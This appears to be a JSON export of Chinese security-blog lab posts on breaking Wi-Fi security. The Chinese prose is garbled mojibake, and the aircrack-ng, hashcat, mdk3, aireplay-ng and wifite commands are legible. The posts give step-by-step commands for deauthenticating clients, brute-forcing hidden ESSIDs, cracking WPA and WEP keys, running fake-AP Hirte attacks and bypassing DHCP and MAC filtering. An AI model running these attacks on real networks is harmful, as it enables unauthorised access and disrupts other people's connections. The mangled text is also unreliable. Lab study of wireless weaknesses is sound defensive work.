å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œæ’å…¥å•ä¸ªESSIDã€‚æ’å…¥å•ä¸ªå¯†ç ä¹Ÿå¯ç±»ä¼¼æ“ä½œã€‚ 1echo Love | airolib-ng gryffinbit --import essid - hashcatå·¥å…·â€‹ hashcatä¸€æ¬¾å¼ºå¤§çš„å¼€æºå¯†ç æ¢å¤å·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥åˆ©ç”¨CPUæˆ–GPUèµ„æºï¼Œç ´è§£å¤šç§hashç±»å‹çš„å¯†ç ã€‚å½“æ•è·æ¡æ‰‹åŒ…ä»¥åï¼Œå¯ä»¥ä½¿ç”¨è¯¥å·¥å…·å¿«é€Ÿçš„ç ´è§£å‡ºWPAå¯†ç ã€‚ä½¿ç”¨hashcatå·¥å…·ç ´è§£WPAçš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1hashcat -m 2500 [pcap file ] [words] --force é€‰é¡¹ è¯´æ˜ -m æŒ‡å®šä½¿ç”¨çš„hashç±»å‹,ä¸WPAç›¸å…³çš„hashå¦‚ä¸‹å›¾ã€‚ Words æŒ‡å®šè¦ä½¿ç”¨çš„å­—å…¸ã€‚ â€“force å¿½ç•¥è­¦å‘Šä¿¡æ¯ã€‚ hashcat â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ 1.ä½¿ç”¨aircrack-ngå°†æ•è·çš„æ¡æ‰‹åŒ…æ–‡ä»¶è½¬æ¢ä¸ºhccapxæ ¼å¼ã€‚ 1aircrack-ng test-01.cap -j hashcattest 2.ä½¿ç”¨hashcatå·¥å…·è¿›è¡Œç ´è§£ã€‚ 1hashcat -m 2500 hashcattest.hccapx /root/password.txt --force","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç‰©è”ç½‘","slug":"å®éªŒ/ç‰©è”ç½‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%89%A9%E8%81%94%E7%BD%91/"}],"tags":[{"name":"WPA","slug":"WPA","permalink":"https://gryffinbit.top/tags/WPA/"}],"author":"Gryffinbit"},{"title":"çªç ´WIFIå®‰å…¨é™åˆ¶","slug":"çªç ´WIFIå®‰å…¨é™åˆ¶","date":"2021-05-04T20:30:43.000Z","updated":"2024-11-12T07:00:03.000Z","comments":true,"path":"2021/05/05/çªç ´WIFIå®‰å…¨é™åˆ¶/","permalink":"https://gryffinbit.top/2021/05/05/%E7%AA%81%E7%A0%B4WIFI%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6/","excerpt":"","text":"AircrackæŒ–æ˜éšè—ESSIDçƒ­ç‚¹å®éªŒåŸç†ï¼šéšè—ESSIDä¹‹åï¼ŒAPå‘å‡ºçš„ç½‘ç»œçš„ä¿¡æ ‡æ•°æ®åŒ…ä¸­ä¸åŒ…æ‹¬å…¶â€œæœåŠ¡é›†æ ‡è¯†â€ï¼Œä¹Ÿä¸å›å¤å®¢æˆ·ç«¯ä»¥å¹¿æ’­æ–¹å¼å‘é€çš„â€œæ¢æµ‹è¯·æ±‚â€æ•°æ®åŒ…ã€‚ä½†ç”¨æˆ·åœ¨ç™»å½•ç½‘ç»œè¿›è¡Œè®¤è¯æ—¶ï¼Œå°±å¿…ç„¶ä¼šç”¨åˆ°â€œæœåŠ¡é›†æ ‡è¯†â€ã€‚ESSIDå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–ï¼šï¼ˆ1ï¼‰å—…æ¢æ— çº¿ç¯å¢ƒï¼Œç„¶åä½¿ç”¨mdk3å·¥å…·æš´åŠ›ç ´è§£éšè—çš„ESSIDã€‚ï¼ˆ2ï¼‰å—…æ¢æ— çº¿ç¯å¢ƒï¼Œç­‰å¾…å®¢æˆ·ç«¯å…³è”åˆ°APï¼Œç„¶åæ•è·è¯¥å…³è”ã€‚ï¼ˆ3ï¼‰å‘èµ·DEAUTHæ”»å‡»ï¼Œè¿«ä½¿åˆæ³•å®¢æˆ·ç«¯æ‰çº¿ï¼Œå¼ºåˆ¶å…¶é‡å…³è”ï¼Œç„¶åæ•è·è¯¥å…³è”ã€‚ 1.å¼€å¯æ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼1airmon-ng start wlan0 2.æ‰«æå‘¨è¾¹æ— çº¿ä¿¡å·1airodump-ng wlan0mon &lt;length:0&gt;è¡¨ç¤ºESSIDè¢«éšè—ã€‚ 3. ä½¿ç”¨mdk3è¿›è¡Œæš´åŠ›ç ´è§£å®‰è£…mdk3 1apt install mdk3 1mdk3 wlan0mon p -b a -t 18:D9:8F:66:CD:7D -s 100 é€‰é¡¹ è¯´æ˜ p æŒ‡å®šä½¿ç”¨BSSIDæ¢æµ‹å’ŒESSIDæš´åŠ›ç ´è§£æ¨¡å¼ã€‚ -b ä½¿ç”¨å…¨æš´åŠ›ç ´è§£æ¨¡å¼ã€‚ -t æŒ‡å®šç›®æ ‡APçš„MACåœ°å€ã€‚ -s è®¾ç½®å‘åŒ…é€Ÿç‡ã€‚ 4. åªæŠ“å–ç‰¹å®šBSSIDçš„APã€‚1airodump-ng wlan0mon -c 1 --bssid 18:D9:8F:66:CD:7C å¯ä»¥çœ‹åˆ°è¿™ä¸ªAPçš„ESSIDå¤„æ˜¾ç¤ºä¸º&lt;length:0&gt;ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªmacåœ°å€ä¸ºå®¢æˆ·ç«¯D0:C6:37:1A:10:E9æ­£åœ¨è¿æ¥ç›®å‰APã€‚ 5.æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯è¿›è¡ŒDEAUTHæ”»å‡»ã€‚1aireplay-ng -0 10 -a 18:D9:8F:66:CD:7C -c **:**:**:**:**: wlan0mon 6. é‡æ–°è¿æ¥æ—¶ï¼Œè‡ªåŠ¨å—…æ¢åˆ°ESSIDå½“å®¢æˆ·ç«¯é‡æ–°è¿æ¥ç›®æ ‡APæ—¶ï¼Œå°±å¯ä»¥è‡ªåŠ¨å—…æ¢åˆ°APçš„ESSIDã€‚æˆ–è€…æœ‰æ–°çš„å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥æ—¶ï¼Œä¹Ÿå¯ä»¥å—…æ¢åˆ°ESSIDã€‚ ç»•è¿‡DHCPå…³é—­é™åˆ¶å®éªŒåŸç†ï¼š â€‹ è·¯ç”±å™¨å…³é—­DHCPåŠŸèƒ½åï¼Œä¹Ÿå°±æ— æ³•è‡ªåŠ¨ç»™å®¢æˆ·ç«¯åˆ†é…IPåœ°å€ã€‚è¿™æ ·ï¼Œå¯¹æ–¹å³ä½¿èƒ½æ‰¾åˆ°è¯¥æ— çº¿ç½‘ç»œä¿¡å·ï¼Œä»ç„¶ä¸èƒ½ä½¿ç”¨ç½‘ç»œã€‚â€‹ æˆ‘ä»¬å¯ä»¥é€šè¿‡airodump-ngæŠ“åŒ…ï¼Œç ´è§£å¯†ç ä¹‹åï¼Œå†ç”¨airdecap-ng è§£å¯†æ•è·æ–‡ä»¶ï¼Œæœ€åç”¨wiresharkåˆ†æDHCP ACKæ•°æ®åŒ…ï¼Œå¾—åˆ°ç›¸åº”çš„é…ç½®ä¿¡æ¯ã€‚ 1. æ‰“å¼€æ— çº¿ç›‘å¬ï¼Œç”¨airodump-ngæŠ“åˆ°æ¡æ‰‹åŒ…å¹¶ä¿å­˜ï¼Œç ´è§£WPA-PSKå¯†ç ã€‚12345airmon-ng start wlan0 airodump-ng wlan0monairbase-ng -c 11 -e å‡å†’AP -W 1 -N wlan0monairodump-ng -c 11 -N å‡å†’AP -w handshake wlan0monaircrack-ng handshake-01.cap å¼€å§‹ç¬¬å››æ­¥æŠ“åŒ…ä¹‹åï¼Œå†è¿å…¥å®¢æˆ·ç«¯ 2. airdecap-ng è§£å¯†WPA&#x2F;WPA2ã€å‰¥ç¦»æ— çº¿æ ‡å¤´airdecap-ng å¯ä»¥è§£å¯†WPA&#x2F;WPA2æ•è·æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºä»æœªåŠ å¯†çš„æ— çº¿æ•è·ä¸­å‰¥ç¦»æ— çº¿æ ‡å¤´ã€‚è¾“å‡ºä¸€ä¸ª-dec.capç»“å°¾çš„æ–°æ–‡ä»¶ï¼Œå®ƒæ˜¯è¾“å‡ºæ–‡ä»¶çš„è§£å¯†ç‰ˆæœ¬ã€‚ é€‰é¡¹ è¯´æ˜ -e ç»™å®šçš„ESSID -p PSKå¯†ç ï¼Œå†æŒ‡å®šè¦è§£å¯†çš„WPAæ•è·åŒ… 1airdecap-ng -e wlan0 -p 1234567 handshake-01.cap ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹åˆ°æˆåŠŸè§£å¯†äº†0ä¸ªåŠ å¯†çš„WPAæ•°æ®åŒ…ï¼Œä¹‹åå°±å¯ä»¥åˆ†æè§£å¯†çš„æ— çº¿æ•°æ®æŠ¥æ–‡ã€‚æ³¨ï¼šå¾…è§£å¯†çš„capæ–‡ä»¶ä¸­å¿…é¡»å«æœ‰æœ‰æ•ˆçš„å››æ¬¡æ¡æ‰‹åŒ…ï¼Œæ‰èƒ½è¿›è¡Œè§£å¯†ã€‚æ­¤å¤–ï¼Œairdecap-ngåªèƒ½è§£å¯†ç‰¹å®šå®¢æˆ·ç«¯å’Œç‰¹å®šAPä¹‹é—´åœ¨æ¡æ‰‹åŒ…ä¹‹åçš„ä¼šè¯æ•°æ®åŒ…ã€‚è¿™æ˜¯å› ä¸ºè§£å¯†æ—¶å¿…é¡»è¦ç”¨åˆ°æ¡æ‰‹è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ•°æ®ä¼ è¾“å¯†é’¥ã€‚ 3. ä½¿ç”¨wiresharkåˆ†æDHCP ACKæ•°æ®åŒ… å¯ä»¥çœ‹åˆ°ç›¸åº”çš„IPåœ°å€ï¼Œé»˜è®¤ç½‘å…³ï¼Œå­ç½‘æ©ç ä»¥åŠDNSæœåŠ¡å™¨ã€‚ è¦è¿æ¥ç›®æ ‡APï¼Œåªéœ€è¾“å…¥ç›¸åº”å¯†ç ï¼Œå¹¶æ‰‹åŠ¨é…ç½®DHCPå³å¯ã€‚ çªç ´macåœ°å€è¿‡æ»¤å®éªŒåŸç†ï¼š â€‹ macåœ°å€è¿‡æ»¤ï¼Œå°±æ˜¯é€šè¿‡äº‹å…ˆåœ¨æ— çº¿è·¯ç”±å™¨å†…è®¾å®šå…è®¸è®¿é—®æˆ–è€…ç¦æ­¢è®¿é—®çš„æ— çº¿å®¢æˆ·ç«¯åˆ—è¡¨æ¥é™åˆ¶ç™»é™†è€…ã€‚ â€‹ å¯ä»¥ç”¨macchangeræŠŠMACåœ°å€ä¿®æ”¹ä¸ºåˆæ³•çš„MACåœ°å€ï¼Œç„¶åå†è¿æ¥APã€‚ 1macchanger â€“help","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"WIFIå¯†ç ç ´è§£ä¹‹WEPåŠ å¯†","slug":"WIFIå¯†ç ç ´è§£ä¹‹WEPåŠ å¯†","date":"2021-05-04T15:10:24.000Z","updated":"2024-11-12T06:59:03.000Z","comments":true,"path":"2021/05/04/WIFIå¯†ç ç ´è§£ä¹‹WEPåŠ å¯†/","permalink":"https://gryffinbit.top/2021/05/04/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWEP%E5%8A%A0%E5%AF%86/","excerpt":"","text":"å‚è€ƒé“¾æ¥ï¼šhttps://www.aircrack-ng.org/doku.php?id=airbase-ng Aircrack-ngç ´è§£WEPåŠ å¯†åŸç†ï¼š â€‹ ARP requesté‡æ”¾æ”»å‡»ï¼Œå½“æŠ“å–åˆ°ä¸€ä¸ªARPè¯·æ±‚åŒ…çš„æ—¶å€™å¯¹å®ƒè¿›è¡Œé‡æ”¾ï¼ŒWEPä½“ç³»å…è®¸IVçš„é‡å¤ä½¿ç”¨ï¼Œå› æ­¤APä¼šå¯¹é‡æ”¾çš„ARP requestè¿›è¡Œåº”ç­”ï¼Œä»è€Œèƒ½å¤Ÿæ”¶é›†åˆ°è¶³å¤Ÿæ•°é‡çš„IVã€‚â€‹ åœ¨å®¢æˆ·ç«¯å¼€å¯æ— çº¿ï¼Œä½†æ˜¯æ²¡æœ‰ä¸ç›®æ ‡APè¿æ¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡airbase-ngä¼ªé€ ç›®æ ‡APæ¥æ¬ºéª—å®¢æˆ·ç«¯ä¸å…¶è¿æ¥ï¼Œè¿™æ—¶ä¹Ÿä¼šäº§ç”Ÿæ¡æ‰‹åŒ…ï¼Œé€šè¿‡è¿™ä¸ªæ¡æ‰‹åŒ…ï¼ŒåŒæ ·å¯ä»¥å®ç°ç ´è§£ç›®æ ‡APæ— çº¿å¯†ç ä»¥åŠå…¥ä¾µå®¢æˆ·ç«¯ã€‚ å¼€å¯æ— çº¿ç½‘å¡ç›‘å¬æ¨¡å¼1234airmon-ng check kill airmon-ng start wlan0iwconfigairmon-ng stop wlan0mon åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤airmon-ng check killï¼Œæ€æ­»å ç”¨æ— çº¿ç½‘å¡çš„ç¨‹åºã€‚è¾“å…¥airmon-ng start wlan0å¼€å¯æ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼ã€‚ å¼€å¯ç›‘å¬ä¹‹åï¼Œæ— çº¿æ¥å£å·²ç»ç”±wlan0å˜æˆäº†wlan0monè¾“å…¥iwconfigå¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶wlan0monå¤„äºç›‘å¬æ¨¡å¼ã€‚è¾“å…¥airmon-ng stop wlan0monç¦ç”¨ç›‘å¬æ¨¡å¼ï¼Œè¿”å›åˆ°ç®¡ç†æ¨¡å¼ã€‚ æ‰«æå‘¨è¾¹æ— çº¿ä¿¡å·ï¼Œæ‰¾åˆ°åŠ å¯†ç®—æ³•ä¸ºWEPçš„AP1airodump-ng wlan0mon Ctrl+C åœæ­¢æ‰«æ æ•è·ç›¸åº”APçš„æ•°æ®åŒ…ï¼Œå¹¶ä¿å­˜æ•è·åˆ°çš„IVsæ•°æ®1airodump-ng wlan0mon --bssid 78:A3:51:15:67:C6 --ivs -w wep -c 3 é€‰é¡¹ è¯´æ˜ â€“ivs è¡¨ç¤ºä»…ä¿å­˜ç”¨äºç ´è§£çš„IVsæ•°æ®æŠ¥æ–‡ï¼› -w æŒ‡å®šæ•°æ®åŒ…ä¿å­˜çš„æ–‡ä»¶å‰ç¼€ï¼› â€“bssid æŒ‡å®šç›®æ ‡APçš„macåœ°å€ï¼› -c æŒ‡å®šç›®æ ‡APå·¥ä½œçš„ä¿¡é“ï¼› å…¶ä¸­ï¼Œæ•è·åˆ°çš„IVsæ•°æ®åŒ…å°†ä¿å­˜åˆ°wep-xx.ivsæ–‡ä»¶ä¸­ ä¸ºäº†åŠ å¿«æ•è·IVsæ•°æ®åŒ…çš„é€Ÿåº¦ï¼Œæ‰“å¼€å¦ä¸€ç»ˆç«¯ï¼Œå‘èµ·ARP requestæ”»å‡»1aireplay-ng -3 -b 78:A3:51:15:67:C6 -h 3c:15:c2:d8:d0:72 wlan0mon é€‰é¡¹ è¯´æ˜ -3 è¡¨ç¤ºå®æ–½ARP requestæ”»å‡»ï¼› -b æŒ‡å®šç›®æ ‡APçš„MACåœ°å€ï¼› -h æŒ‡å®šè¿æ¥APçš„åˆæ³•å®¢æˆ·ç«¯çš„MACåœ°å€ã€‚ å½“#Dataåˆ—æ•°å€¼è¶…è¿‡2ä¸‡æ—¶ï¼Œå¯ä»¥å°è¯•è¿›è¡Œç ´è§£ã€‚æ³¨ï¼šå¦‚æœè¯¥APæ­£åœ¨è¿›è¡Œå¤§æµé‡äº¤äº’ï¼Œ#Dataåˆ—æ•°å€¼å¢é•¿å¾ˆå¿«ï¼Œåˆ™ä¸éœ€è¿›è¡ŒARPæ”»å‡»ã€‚ ä½¿ç”¨aircrack-ngå·¥å…·ç ´è§£å¯†ç 1aircrack-ng wep-01.ivs Hirteæ”»å‡»ç ´è§£WEPæ”»å‡»æ€è·¯ï¼š Hirteæ˜¯ç ´è§£æ— çº¿ç½‘ç»œWEP Keyçš„ä¸€ç§æ”»å‡»ç±»å‹ ã€‚ åªè¦å®¢æˆ·ç«¯è®¾å¤‡ï¼ˆç¬”è®°æœ¬ç”µè„‘ï¼Œæ‰‹æœºç­‰ï¼‰è¿æ¥è¿‡çš„æ— çº¿ç½‘ç»œï¼Œé‚£äº›WIFIå³ä½¿æ˜¯ä¸åœ¨æ”»å‡»è€…èŒƒå›´å†…ä¹Ÿéƒ½èƒ½è¢«ç ´è§£ï¼Œå› ä¸ºè¯¥wifiçš„WEPå¯†é’¥å’Œé…ç½®æ–‡ä»¶ä»ç„¶å­˜å‚¨åœ¨è¿™äº›æ— çº¿è®¾å¤‡ä¸­ã€‚ å®æ–½è¿™ç§æ”»å‡»çš„è¦æ±‚æ˜¯å»ºç«‹ä¸€ä¸ªå’ŒWEPç½‘ç»œç›¸åŒçš„SSIDå‡å†’æ¥å…¥ç‚¹ã€‚å½“å®¢æˆ·ç«¯è®¾å¤‡å°è¯•è‡ªåŠ¨è¿æ¥åˆ°æ— çº¿ç½‘ç»œè®¾æ—¶ï¼Œå‡å†’æ¥å…¥ç‚¹ï¼ˆæ”»å‡»è€…æœºå™¨ï¼‰ä¼šå¯¹å—å®³è€…è®¾å¤‡è¿›è¡ŒARPæ”»å‡»ï¼Œå¯¼è‡´å—å®³è€…è®¾å¤‡å°†åŒ…å«å¯†é’¥æµçš„æ•°æ®åŒ…å‘å‡ºã€‚ ç”¨airbase-ngå·¥å…·å»ºç«‹WEPæ¥å…¥ç‚¹1airbase-ng -c 7 -e å‡å†’AP -W 1 -N wlan0mon é€‰é¡¹ è¯´æ˜ -c å®šä¹‰ä¿¡é“ -e æŒ‡å®šè¦å‡å†’APçš„åå­— -W è®¾ç½®åŠ å¯†ä½ -N ä½¿ç”¨Hirteæ”»å‡»æ¨¡å¼ã€‚ airbase-ngå»ºç«‹äº†ä¸€ä¸ªBSSID ä¸º00:24:B2:4A:DE:BDçš„AP ã€‚åé¢æ˜¯å®¢æˆ·ç«¯è¿æ¥è¿™ä¸ªå‡å†’APä¹‹åå¼€å§‹Hirteæ”»å‡» ã€‚æ³¨ï¼šç¬¬äºŒæ­¥å¼€å§‹æ•è·æ•°æ®åŒ…ä¹‹åï¼Œå†ç”¨å®¢æˆ·ç«¯è¿æ¥å‡å†’APã€‚ é…ç½®airodump-ngæ•æ‰æ•°æ®åŒ…å¹¶ä¿å­˜æ•°æ®åŒ…æ–‡ä»¶åå­—ä¸ºcfrag1airodump-ng -c 7 -N å‡å†’AP -w cfrag wlan0mon ä½¿ç”¨aircrack-ngç ´è§£WEPã€‚æ¯æ•è·5000ä¸ªIVså°±å¼€å§‹é‡æ–°æ”»å‡»ï¼Œç›´è‡³ç ´è§£ 1aircrack-ng cfrag-01.cap ä½¿ç”¨Wifiteå·¥å…·ç ´è§£WEPWifiteæ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–WEPã€WPAå’ŒWPSç ´è§£å·¥å…·ã€‚ ç ´è§£ 1wifite --wep --keep-ivs é€‰é¡¹ è¯´æ˜ â€“wep è¡¨ç¤ºä»…æ˜¾ç¤ºWEPåŠ å¯†ç½‘ç»œï¼› â€“keep-ivs è¡¨ç¤ºä¿ç•™IVsæ–‡ä»¶ã€‚ Wifiteå°†å¼€å§‹ç­‰å¾…WEP replayï¼Œå½“WEP replayè¶…è¿‡10000æ—¶ï¼Œå°±ä¼šå¼€å§‹å°è¯•ç ´è§£ã€‚ ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸç ´è§£äº†ç›®å‰APçš„å¯†ç ã€‚ç ´è§£çš„å¯†ç é»˜è®¤ä¿å­˜åˆ°cracked.jsonä¸­ã€‚ æŸ¥çœ‹cracked.jsonæ–‡ä»¶ã€‚ 1cat cracked,json ä»è¾“å‡ºä¿¡æ¯å¯ä»¥çœ‹åˆ°ç ´è§£çš„APçš„ç›¸å…³ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œè¯¥APçš„ESSIDå’ŒBSSIDï¼ŒåŠ å¯†ç±»å‹ä¸ºWEPï¼Œåå…­è¿›åˆ¶å¯†é’¥ä¸ºï¼š12:34:56:78:90 åŠ å¯† åŒæ ·çš„ï¼Œå¯ä»¥ä½¿ç”¨wifite ç ´è§£WPAåŠ å¯†ã€‚ é€‰é¡¹ è¯´æ˜ â€“wpa è¡¨ç¤ºä»…æ‰«æWPAåŠ å¯†çš„ç½‘ç»œã€‚ â€“dict æŒ‡å®šå¯†ç å­—å…¸ã€‚ wifite â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ ä½¿ç”¨Fern WiFi Crackerå·¥å…·ç ´è§£WEPFern WiFi Crackeræ˜¯ä¸€æ¬¾æ— çº¿å®‰å…¨å®¡è®¡å’Œæ”»å‡»è½¯ä»¶ï¼Œä½¿ç”¨Pythonç¼–ç¨‹è¯­è¨€å’ŒPythonçš„Qtå›¾å½¢ç•Œé¢åº“å®ç°ã€‚è¯¥å·¥å…·å¯ä»¥ç ´è§£å¹¶æ¢å¤WEPã€WPAã€WPSåŠ å¯†çš„æ— çº¿ç½‘ç»œå¯†ç ã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"WIFIå¯†ç ç ´è§£ä¹‹Aircrack-ngå·¥å…·é›†","slug":"WIFIå¯†ç ç ´è§£ä¹‹Aircrack-ngå·¥å…·é›†","date":"2021-05-03T16:33:15.000Z","updated":"2024-11-12T06:59:03.000Z","comments":true,"path":"2021/05/04/WIFIå¯†ç ç ´è§£ä¹‹Aircrack-ngå·¥å…·é›†/","permalink":"https://gryffinbit.top/2021/05/04/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BAircrack-ng%E5%B7%A5%E5%85%B7%E9%9B%86/","excerpt":"","text":"å®éªŒç¯å¢ƒ macOS Catalina 10.15.7 å‚è€ƒé“¾æ¥ï¼šhttps://mba811.gitbooks.io/web-study/content/wlaq/gj/w1.html å‚è€ƒé“¾æ¥ï¼šhttps://osxdaily.com/2007/01/18/airport-the-little-known-command-line-wireless-utility/ å‚è€ƒé“¾æ¥ï¼šhttps://gwliang.com/2020/01/24/wifi-cracking/#appendix.zh.md å‚è€ƒé“¾æ¥ï¼šhttps://github.com/0x0XDev/JamWiFi Kali å®éªŒæ­¥éª¤æ–‡æ¡£ä¸‹è½½é“¾æ¥ é“¾æ¥: https://pan.baidu.com/s/1lsYFPKTl4SY9Ksltl9OShw æå–ç : tx86 å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦ å®‰è£… Download and install XCode 1xcode-select --install Download and install MacPorts Update Mac Ports 1sudo port -v selfupdate Install AirCrack 1brew install aircrack-ng create a symbolic link to the airport command 1cd /usr/sbin 1sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport aircrack - ngâ€‹ Aircrack-ngæ˜¯ä¸€ä¸ªåŒ…å«äº†å¤šæ¬¾å·¥å…·çš„æ— çº¿æ”»å‡»å®¡è®¡å¥—è£…ï¼Œå…¶ä¸­åŒ…å«çš„å·¥å…·åœ¨æ— çº¿ç ´è§£è¿‡ç¨‹ä¸­éƒ½ä¼šç”¨åˆ°ã€‚â€‹ åœ¨ç›®æ ‡APå·²æœ‰åˆæ³•å®¢æˆ·ç«¯è¿æ¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡airodump-ngä¾¦å¬æ•°æ®åŒ…ï¼Œç„¶åç”¨aireplay-ngçš„deauthå¼ºåˆ¶åˆæ³•å®¢æˆ·ç«¯æ‰çº¿ï¼Œæ‰çº¿åå®¢æˆ·ç«¯ä¼šå°è¯•é‡æ–°è¿æ¥APï¼Œæ­¤æ—¶ä¼šäº§ç”Ÿæ¡æ‰‹åŒ…ã€‚å¦‚æœæˆåŠŸæŠ“å–åˆ°è¯¥æ¡æ‰‹åŒ…ï¼Œåˆ™å¯ä»¥ç”¨å­—å…¸è¿›è¡Œæœ¬åœ°ç¦»çº¿ç ´è§£ã€‚ä½¿ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œæ”»å‡»çš„å‰ææœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯å¿…é¡»å¤„åœ¨ç›®æ ‡APçš„ä¿¡å·èŒƒå›´å†…ï¼›äºŒæ˜¯å·²æœ‰åˆæ³•å®¢æˆ·ç«¯è¿æ¥è¯¥APã€‚â€‹ åœ¨å®¢æˆ·ç«¯å¼€å¯æ— çº¿ï¼Œä½†æ˜¯æ²¡æœ‰ä¸ç›®æ ‡APè¿æ¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡airbase-ngä¼ªé€ ç›®æ ‡APæ¥æ¬ºéª—å®¢æˆ·ç«¯ä¸å…¶è¿æ¥ï¼Œè¿™æ—¶ä¹Ÿä¼šäº§ç”Ÿæ¡æ‰‹åŒ…ï¼Œé€šè¿‡è¿™ä¸ªæ¡æ‰‹åŒ…ï¼ŒåŒæ ·å¯ä»¥å®ç°ç ´è§£ç›®æ ‡APæ— çº¿å¯†ç ä»¥åŠå…¥ä¾µå®¢æˆ·ç«¯ã€‚ æ— çº¿ç½‘å¡å·¥ä½œæ¨¡å¼ ç®¡ç†æ¨¡å¼ï¼ˆManagedï¼‰Managedæ¨¡å¼ç”¨äºæ— çº¿STAç›´æ¥ä¸æ— çº¿APè¿›è¡Œæ¥å…¥è¿æ¥ã€‚ ä¸»æ¨¡å¼ï¼ˆMasterï¼‰Masteræ¨¡å¼å…è®¸æ— çº¿ç½‘å¡ä½¿ç”¨ç‰¹åˆ¶çš„é©±åŠ¨ç¨‹åºå’Œè½¯ä»¶å·¥ä½œï¼Œä½œä¸ºå…¶ä»–è®¾å¤‡çš„æ— çº¿APã€‚ä¾‹å¦‚ï¼Œæ— çº¿è·¯ç”±å™¨å°±æ˜¯å·¥ä½œåœ¨Masteræ¨¡å¼ä¸‹ã€‚å¯¹äºæ™®é€šçš„PCæœºæ¥è¯´ï¼Œå¦‚æœæœ‰åˆé€‚çš„ç¡¬ä»¶ä¹Ÿå¯ä»¥å˜æˆä¸€å°æ— çº¿APã€‚ Ad_hocæ¨¡å¼ å½“ç”¨æˆ·çš„ç½‘ç»œç”±äº’ç›¸ç›´è¿çš„è®¾å¤‡ç»„æˆæ—¶ï¼Œå°±ä½¿ç”¨Ad_hocæ¨¡å¼ã€‚åœ¨è¿™ä¸ªæ¨¡å¼ä¸­ï¼Œå„è®¾å¤‡ä¹‹é—´é‡‡ç”¨å¯¹ç­‰ç½‘ç»œçš„æ–¹å¼è¿›è¡Œè¿æ¥ï¼Œæ— çº¿é€šä¿¡åŒæ–¹å…±åŒæ‰¿æ‹…æ— çº¿APçš„èŒè´£ã€‚ ç›‘å¬æ¨¡å¼ï¼ˆMonitorï¼‰ Monitoræ¨¡å¼ä¸»è¦ç”¨äºç›‘æ§æ— çº¿ç½‘ç»œå†…éƒ¨çš„æµé‡ï¼Œç”¨äºæ£€æµ‹ç½‘ç»œå’Œæ’é”™ã€‚å¦‚æœè¦æ•è·æ— çº¿æ•°æ®åŒ…ï¼Œç”¨æˆ·çš„æ— çº¿ç½‘å¡å’Œé…å¥—çš„é©±åŠ¨å¿…é¡»æ”¯æŒç›‘å¬æ¨¡å¼ã€‚ â€‹ æ­£å¸¸æƒ…å†µä¸‹ï¼Œç½‘å¡éƒ½å·¥ä½œåœ¨ç®¡ç†æ¨¡å¼ï¼Œå°†è¦å‘é€çš„æ•°æ®åŒ…å‘å¾€è¿æ¥åœ¨ä¸€èµ·çš„æ‰€æœ‰ä¸»æœºï¼Œæ•°æ®åŒ…ä¸­åŒ…å«ç€åº”è¯¥æ¥æ”¶æ•°æ®åŒ…ä¸»æœºçš„æ­£ç¡®åœ°å€ï¼Œåªæœ‰ä¸æ•°æ®åŒ…ä¸­ç›®æ ‡åœ°å€ä¸€è‡´çš„ä¸»æœºæ‰èƒ½æ¥æ”¶ã€‚ â€‹ ä½†å½“å¤„äºç›‘å¬æ¨¡å¼æ—¶ï¼Œæ— è®ºæ•°æ®åŒ…ä¸­çš„ç›®æ ‡åœ°å€æ˜¯ä»€ä¹ˆï¼Œä¸»æœºéƒ½å°†æ¥æ”¶ï¼Œè€Œä¸”ç½‘ç»œç›‘å¬ä¸å®¹æ˜“è¢«å‘ç°ã€‚ â€‹ å› 